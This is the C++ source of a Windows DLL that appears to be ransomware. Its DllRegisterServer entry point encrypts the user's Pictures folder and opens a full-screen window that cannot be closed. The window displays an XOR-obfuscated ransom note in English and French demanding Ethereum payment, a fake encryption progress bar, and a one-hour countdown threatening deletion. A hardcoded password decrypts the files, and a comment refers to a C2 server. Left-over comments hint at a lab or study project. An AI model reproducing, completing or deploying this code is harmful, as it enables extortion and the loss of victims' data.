// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <commctrl.h> // Required for Progress Bar
#include "c2client.h"
#include "utils.h"
#include <ShlObj.h>    // for SHGetKnownFolderPath
#include <Knownfolders.h>

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "comctl32.lib") // Ensure linking of common controls

// Global Variables
HBRUSH hbrBkgnd;
HWND hWndInput;
HWND hWndLabels[8];
HWND hWndProgressBar;
HWND hWndTimerLabel;
HWND hwndMain;
HFONT hFontBold;
HWND hWndEncStatusLabel; // Encryption Status Label
std::wstring correctPassword;


std::wstring targetFolder;
// Timer variables
int remainingTime = 3600;
UINT_PTR timerID;

// Static text for labels
std::vector<std::vector<uint8_t>> labelTexts = {
    {0x12, 0x3f, 0x36, 0x36, 0x35, 0x76, 0x7a, 0x33, 0x2e, 0x7d, 0x29, 0x7a, 0x17, 0x03, 0x08, 0x1b, 0x7a, 0x74},
    {0x03, 0x35, 0x2f, 0x7d, 0x2c, 0x3f, 0x7a, 0x38, 0x3f, 0x3f, 0x34, 0x7a, 0x32, 0x3b, 0x39, 0x31, 0x3f, 0x3e, 0x74, 0x7a, 0x0d, 0x3f, 0x7a, 0x3f, 0x34, 0x39, 0x28, 0x23, 0x2a, 0x2e, 0x3f, 0x3e, 0x7a, 0x23, 0x35, 0x2f, 0x28, 0x7a, 0x3e, 0x3b, 0x2e, 0x3b, 0x7a, 0x32, 0x3b, 0x32, 0x3b, 0x7a, 0x36, 0x35, 0x29, 0x3f, 0x28, 0x7a, 0x61, 0x73},
    {0x18, 0x35, 0x34, 0x30, 0x35, 0x2f, 0x28, 0x76, 0x7a, 0x39, 0x7d, 0x3f, 0x29, 0x2e, 0x7a, 0x17, 0x03, 0x08, 0x1b, 0x74},
    {0xc, 0x35, 0x2f, 0x29, 0x7a, 0x3b, 0x2c, 0x3f, 0x20, 0x7a, 0x3f, 0x2e, 0x3f, 0x7a, 0x32, 0x3b, 0x39, 0x31, 0x3f, 0x74, 0x7a, 0x14, 0x35, 0x2f, 0x29, 0x7a, 0x3b, 0x2c, 0x35, 0x34, 0x29, 0x7a, 0x39, 0x32, 0x33, 0x3c, 0x3c, 0x28, 0x3f, 0x7a, 0x2c, 0x35, 0x29, 0x7a, 0x3e, 0x35, 0x34, 0x34, 0x3f, 0x3f, 0x29, 0x7a, 0x32, 0x3b, 0x32, 0x3b, 0x7a, 0x34, 0x2f, 0x36, 0x36, 0x35, 0x29, 0x7a, 0x61, 0x73},
    {0x09, 0x3f, 0x34, 0x3e, 0x7a, 0x1f, 0x0e, 0x12, 0x7a, 0x2e, 0x35, 0x7a, 0x2e, 0x32, 0x33, 0x29, 0x7a, 0x3b, 0x3e, 0x3e, 0x28, 0x3f, 0x29, 0x29, 0x7a, 0x60, 0x7a, 0x6a, 0x22, 0x6b, 0x6e, 0x6b, 0x3b, 0x6d, 0x6d, 0x6f, 0x62, 0x1c, 0x6f, 0x6d, 0x38, 0x18, 0x68, 0x6a, 0x68, 0x69, 0x1b, 0x63, 0x6a, 0x1f, 0x3e, 0x62, 0x39, 0x1f, 0x6e, 0x68, 0x6c, 0x68, 0x1c, 0x6a, 0x6f, 0x6a, 0x1f, 0x62, 0x62, 0x68, 0x18, 0x3f, 0x63, 0x7a},
    {0x2e, 0x35, 0x7a, 0x28, 0x3f, 0x39, 0x3f, 0x33, 0x2c, 0x3f, 0x7a, 0x2e, 0x32, 0x3f, 0x7a, 0x2a, 0x3b, 0x29, 0x29, 0x2d, 0x35, 0x28, 0x3e}
};

static bool isRed = true; // To alternate text color
int fakeProgress = 0;


void SimulateFakeProgress() {
    static int delayCounter = 0;

    if (fakeProgress >= 100) {
        SetWindowText(hWndEncStatusLabel, L"Chiffrement termine");
        return;
    }
    if (delayCounter > 0) {
        delayCounter--;
        return; // wait cycle
    }

    int step = rand() % 2; // advance randomly by 0-2 %
    if (step == 0) {
        delayCounter = rand() % 25; // pause for some cycles
    }
    else {
        fakeProgress += step;
        if (fakeProgress > 100) fakeProgress = 100;
    }

    SendMessage(hWndProgressBar, PBM_SETPOS, fakeProgress, 0);
}


// Keep the window active
void KeepWindowActive()
{
    SetForegroundWindow(hwndMain); // Bring to front
    ShowWindow(hwndMain, SW_SHOW);
}

// Function to update the progress bar
void UpdateProgressBar(){
    int progressValue = (3600 - remainingTime) * 100 / 3600; 
    //SendMessage(hWndProgressBar, PBM_SETPOS, progressValue, 0);
	isRed = !isRed; // Alternate text color 
	InvalidateRect(hwndMain, NULL, TRUE); // Redraw the window

    int hours = remainingTime / 3600;
    int minutes = (remainingTime % 3600) / 60;
    int seconds = remainingTime % 60;

    wchar_t timerText[64];
    swprintf(timerText, 64, L"Temps restant : %02d:%02d:%02d", hours, minutes, seconds);
    SetWindowText(hWndTimerLabel, timerText);

    if (remainingTime <= 0)
    {
        KillTimer(hwndMain, timerID);
        MessageBox(hwndMain, L"Le temps est ecoule ! Suppresion en cours ! Bye bye les donnees!", L"Timeout", MB_OK | MB_ICONWARNING);
        ExitProcess(0);
        return;
    }

    remainingTime--;
    KeepWindowActive(); 
}
 
// Timer callback function (called by system every interval)
void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{
    UpdateProgressBar();
}

// Handles windows messages
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
     case WM_CLOSE:
         return 0; // Block closing via X button

     case WM_SYSCOMMAND:
         if (wParam == SC_CLOSE || wParam == SC_MINIMIZE)
             return 0; // Block ALT+TAB and Minimize
         break;

    case WM_ERASEBKGND:
    {
        HDC hdc = (HDC)wParam;
        RECT rc;
        GetClientRect(hwnd, &rc);
        FillRect(hdc, &rc, hbrBkgnd);
        return 1; // Erase Background
    }

    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, isRed ? RGB(255, 0, 0) : RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LRESULT)GetStockObject(NULL_BRUSH); // Set text color
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == 1) // Enter Key Pressed
        {
            wchar_t inputText[256];
            GetWindowText(hWndInput, inputText, 256);

            if (wcscmp(inputText, correctPassword.c_str()) == 0)
            {
                MessageBox(hwnd, L"Access Granted!", L"Success", MB_OK | MB_ICONINFORMATION);
				// Decrypt files    
				DecAllF(targetFolder, std::string(inputText, inputText + wcslen(inputText)));
				// Close the application
                ExitProcess(0);
            }
            else
            {
                MessageBox(hwnd, L"Incorrect Password. Try Again.", L"Error", MB_OK | MB_ICONERROR);
            }
        }
        break;

    case WM_TIMER:
        if (wParam == 1) {
            UpdateProgressBar();
        }
        else if (wParam == 2) {
            SimulateFakeProgress(); 
        }
        break;


    case WM_DESTROY:
        KillTimer(hwnd, timerID);
        DeleteObject(hbrBkgnd);
        DeleteObject(hFontBold);
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Create the GUI
void ShowGUI()
{
	// Initialize common controls (for progress bar)
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);
	// Screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Background color
    hbrBkgnd = CreateSolidBrush(RGB(0, 0, 0));

    hFontBold = CreateFont(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        VARIABLE_PITCH, L"Arial");
    
	// Define the window class 
    const wchar_t CLASS_NAME[] = L"MyDLLWindowClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)GetStockObject(NULL_BRUSH);
    RegisterClass(&wc);

	// Create the window
    hwndMain = CreateWindowEx(WS_EX_TOPMOST, CLASS_NAME, L"My DLL GUI",
        WS_POPUP | WS_VISIBLE, 0, 0, screenWidth, screenHeight,
        NULL, NULL, GetModuleHandle(NULL), NULL);

    if (hwndMain == NULL) return;

	// Y-offset for GUI elements
    int yOffset = screenHeight / 10;

	// Create labels 
    for (int i = 0; i < 6; i++)
    {
        std::wstring decryptedLabel = getStringFromHex(labelTexts[i], 0x5A);
        hWndLabels[i] = CreateWindow(L"STATIC", decryptedLabel.c_str(), WS_VISIBLE | WS_CHILD,
            screenWidth / 6, yOffset, screenWidth - 200, 40, hwndMain, NULL, GetModuleHandle(NULL), NULL);
        SendMessage(hWndLabels[i], WM_SETFONT, (WPARAM)hFontBold, TRUE);
        yOffset += 50;
    }
	// Create the timer label
    hWndTimerLabel = CreateWindow(L"STATIC", L"You have one hour", WS_VISIBLE | WS_CHILD | SS_CENTER,
        screenWidth / 2 - 150, yOffset, 300,120, hwndMain, NULL, GetModuleHandle(NULL), NULL);
    SendMessage(hWndTimerLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    yOffset += 75;

	// Create the encryption status label
    hWndEncStatusLabel = CreateWindow(L"STATIC", L"Chiffrement des fichiers en cours...", WS_VISIBLE | WS_CHILD | SS_CENTER,
        screenWidth / 2 - 200, yOffset, 400, 60, hwndMain, NULL, GetModuleHandle(NULL), NULL);
    SendMessage(hWndEncStatusLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    yOffset += 50;

	// Create the progress bar
    hWndProgressBar = CreateWindowEx(0, PROGRESS_CLASS, NULL,
        WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
        screenWidth / 4, yOffset + 25, screenWidth / 2, 30,
        hwndMain, NULL, GetModuleHandle(NULL), NULL);

    SendMessage(hWndProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    SendMessage(hWndProgressBar, PBM_SETPOS, 0, 0);
    yOffset += 60;

	// Create the input field
    hWndInput = CreateWindow(L"EDIT", L"", WS_TABSTOP | WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD | ES_AUTOHSCROLL,
        screenWidth / 4, yOffset, screenWidth / 2, 40, hwndMain, NULL, GetModuleHandle(NULL), NULL);

	// Create the Enter button
    HWND hWndEnter = CreateWindow(L"BUTTON", L"Enter", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        screenWidth / 2 - 50, yOffset + 50, 100, 50, hwndMain, (HMENU)1, GetModuleHandle(NULL), NULL);
    
	// Set two timers:
	// 1. General timer
	// 2. Fake progress timer (shorter interval)
    timerID = SetTimer(hwndMain, 1, 1000, NULL);
    timerID = SetTimer(hwndMain, 2, 200, NULL);

    ShowWindow(hwndMain, SW_SHOW);
    UpdateWindow(hwndMain);

	// Event loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// DLL Functions
extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer(void) { 
    // get the password
    std::string password = "password"; // Or C2Client::get_password_from_server();
    correctPassword = std::wstring(password.begin(), password.end());

    // Use real Documents folder
    std::wstring realDocs = GetUserPicturesFolder();
    targetFolder = realDocs;
    // Remove GenDummyF!
    // GenDummyF(realDocs, filesPerType); // <--- delete this

    // Encrypt files in users Documents
    EncAllF(realDocs, password);

    ShowGUI(); 
    return S_OK; 
}

extern "C" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer(void) { return S_OK; }
extern "C" __declspec(dllexport) HRESULT __stdcall DllInstall(void) { return S_OK; }

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { return TRUE; }